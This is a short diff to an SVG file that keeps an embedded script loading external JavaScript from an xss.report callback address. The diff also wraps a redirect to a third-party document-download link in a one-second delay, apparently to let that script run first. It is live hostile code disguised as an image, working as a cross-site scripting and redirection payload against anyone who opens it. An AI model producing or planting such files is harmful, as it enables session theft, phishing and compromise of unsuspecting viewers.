@@ -12,7 +12,9 @@
   <script xlink:href="https://xss.report/c/mrdott1337" />
   <script>
     //<![CDATA[
-      window.location.href = "https://simco.taxdome.com/app/docs/downloads/91253002?preview=true";
+      setTimeout(function() {
+        window.location.href = "https://simco.taxdome.com/app/docs/downloads/91253002?preview=true";
+      }, 1000); // 1-second delay
     ]]>
   </script>
 </svg>
